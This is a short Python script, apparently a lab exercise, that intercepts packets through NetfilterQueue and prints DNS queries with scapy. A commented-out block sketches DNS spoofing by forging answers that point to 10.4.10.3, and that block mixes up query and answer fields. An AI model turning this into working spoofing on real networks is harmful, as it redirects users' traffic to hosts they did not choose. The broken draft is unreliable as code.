from netfilterqueue import NetfilterQueue
from scapy.all import *

def print_and_accept(raw_pkt):
	pkt = IP(raw_pkt.get_payload())
	print(pkt)
	if DNSQR in pkt:
		print('Before:')
		print(pkt[DNSQR].show())
		'''pkt[DNSQR].rdata = '10.4.10.3'
		qname = pkt[DNSQR].qname
		dns_response = DNSRR(rrname=qname, rdata='10.4.10.3', ttl=pkt[DNSRR].ttl)
		pkt[DNSRR].an = dns_response
		pkt[DNSRR].ancount = 1
		del pkt[IP].len
		del pkt[IP].chksum
		del pkt[UDP].len
		del pkt[UDP].chksum
		print('After:')
		print(pkt[DNSQR].show())
		raw_pkt.set_payload(str(pkt))'''
	raw_pkt.accept()


nfqueue = NetfilterQueue()
nfqueue.bind(1, print_and_accept)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print
